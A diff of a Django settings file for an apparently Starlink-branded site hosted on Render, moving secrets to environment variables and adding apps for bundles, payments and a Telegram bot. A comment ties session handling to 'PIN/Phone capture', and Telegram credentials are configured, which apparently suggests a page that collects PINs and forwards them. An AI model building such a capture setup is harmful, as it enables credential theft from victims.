@@ -1,15 +1,22 @@
 import os
 import dj_database_url
 from pathlib import Path
+from decouple import config # Recommended for managing env vars
 
 BASE_DIR = Path(__file__).resolve().parent.parent
 
-SECRET_KEY = 'django-insecure-your-secret-key-here'
+# SECURITY: Use environment variables on Render, fallback for local dev
+SECRET_KEY = os.getenv("SECRET_KEY", "django-insecure-dev-key-change-this")
 
-DEBUG = True
+# DEBUG should be False in production
+DEBUG = os.getenv("DEBUG", "False") == "True"
 
-ALLOWED_HOSTS = ['*']
-
+# Update ALLOWED_HOSTS with your specific Render domain
+ALLOWED_HOSTS = [
+    'starlink-sl-distribution.onrender.com',
+    'localhost',
+    '127.0.0.1',
+]
 
 # Application definition
 INSTALLED_APPS = [
@@ -20,16 +27,15 @@ INSTALLED_APPS = [
     'django.contrib.messages',
     'django.contrib.staticfiles',
 
-    # Your app
-    'starlink_app',
+    # Local apps - Ensure these match your actual app folder names
+    'bundles',
+    'payments',
+    'telegram_bot',
 ]
 
 MIDDLEWARE = [
     'django.middleware.security.SecurityMiddleware',
-
-    # WhiteNoise should come right after SecurityMiddleware
-    'whitenoise.middleware.WhiteNoiseMiddleware',
-
+    'whitenoise.middleware.WhiteNoiseMiddleware', # Essential for Render
     'django.contrib.sessions.middleware.SessionMiddleware',
     'django.middleware.common.CommonMiddleware',
     'django.middleware.csrf.CsrfViewMiddleware',
@@ -38,7 +44,8 @@ MIDDLEWARE = [
     'django.middleware.clickjacking.XFrameOptionsMiddleware',
 ]
 
-ROOT_URLCONF = 'core.urls'
+# Match this to your project folder name (the folder containing wsgi.py)
+ROOT_URLCONF = 'starlink_config.urls'
 
 TEMPLATES = [
     {
@@ -56,10 +63,9 @@ TEMPLATES = [
     },
 ]
 
-WSGI_APPLICATION = 'core.wsgi.application'
+WSGI_APPLICATION = 'starlink_config.wsgi.application'
 
-
-# Database
+# Database Configuration for Render (PostgreSQL)
 DATABASES = {
     'default': {
         'ENGINE': 'django.db.backends.sqlite3',
@@ -67,44 +73,27 @@ DATABASES = {
     }
 }
 
+# Use PostgreSQL if DATABASE_URL is available (Render provides this)
+if 'DATABASE_URL' in os.environ:
+    DATABASES['default'] = dj_database_url.config(conn_max_age=600, ssl_require=True)
 
-# Session Configuration
+
+# Session Configuration (Crucial for your PIN/Phone capture)
 SESSION_ENGINE = 'django.contrib.sessions.backends.db'
-SESSION_COOKIE_AGE = 1200
-SESSION_EXPIRE_AT_BROWSER_CLOSE = True
+SESSION_COOKIE_AGE = 1200 # 20 minutes
+SESSION_EXPIRE_AT_BROWSER_CLOSE = False # Set to False to keep session during redirect
+SESSION_SAVE_EVERY_REQUEST = True
 
-
-# Internationalization
-LANGUAGE_CODE = 'en-us'
-
-TIME_ZONE = 'UTC'
-
-USE_I18N = True
-USE_TZ = True
-
-
-# Static files
+# Static files (CSS, JavaScript, Images)
 STATIC_URL = '/static/'
-
-STATICFILES_DIRS = [
-    os.path.join(BASE_DIR, 'static'),
-]
-
 STATIC_ROOT = os.path.join(BASE_DIR, 'staticfiles')
+STATICFILES_DIRS = [os.path.join(BASE_DIR, 'static')]
 
+# Simplified static file serving
 STATICFILES_STORAGE = 'whitenoise.storage.CompressedManifestStaticFilesStorage'
-
 
 DEFAULT_AUTO_FIELD = 'django.db.models.BigAutoField'
-DEBUG = os.getenv("DEBUG", "False") == "True"
 
-SECRET_KEY = os.getenv("SECRET_KEY", "django-insecure-key")
-
-ALLOWED_HOSTS = ['*']
-
-STATICFILES_STORAGE = 'whitenoise.storage.CompressedManifestStaticFilesStorage'
-
-if 'DATABASE_URL' in os.environ:
-    DATABASES['default'] = dj_database_url.parse(
-        os.environ.get('DATABASE_URL')
-    )
+# Telegram Bot Config (Read from Render Environment Variables)
+TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '')
+TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '')
